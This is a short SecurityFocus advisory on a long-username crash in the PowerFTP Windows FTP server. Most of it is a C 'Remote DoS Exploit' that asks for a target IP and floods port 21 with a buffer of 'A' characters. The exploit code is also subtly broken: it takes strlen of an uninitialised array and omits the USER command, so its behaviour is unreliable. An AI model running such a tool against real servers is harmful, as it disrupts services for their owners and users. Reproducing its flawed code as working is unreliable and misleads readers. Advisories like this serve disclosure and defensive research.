source: http://www.securityfocus.com/bid/5899/info

PowerFTP server is a shareware ftp server available for the Microsoft Windows platform. It is distributed and maintained by Cooolsoft.

It has been reported that PowerFTP server does not properly handle long user names. When excessive data is supplied as an argument to the FTP 'USER' command, the server becomes unstable. Exploitation of this vulnerability typically results in a crash of the server, requiring a manual restart to resume FTP service. 

/* Remote DoS Exploit for PowerFTP server (all version) */
/* Coding by Morgan A. member of secureNT-2000 Greetz : */
/* kdm, Yann, GaLiaRepT, and all i've forgotten ;)      */

#include <stdio.h>
#include <winsock.h>
        #pragma comment(lib, "wsock32.lib")

void main()
        {
        WSADATA WSAData;
                WSAStartup(MAKEWORD(2,0), &WSAData);

                SOCKET sock;
                SOCKADDR_IN sin;
                char *buffer = new char[255];

        char ip[50];
        printf ("Remote DoS Exploit for PowerFTP server\n\n");
        printf ("Remote IP: ");
        scanf ("%s", &ip);

        char DoS[3000];
        int i;
        for(i=0;i<strlen(DoS);i++)
        {
        DoS[i]= 'A';
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);

                sin.sin_addr.s_addr                     = inet_addr(ip);
                sin.sin_family                          = AF_INET;
                sin.sin_port                            = htons(21);

                connect(sock, (SOCKADDR *)&sin, sizeof(sin));
                send(sock, DoS, sizeof(DoS), 0);
                closesocket(sock);
                WSACleanup();
        }
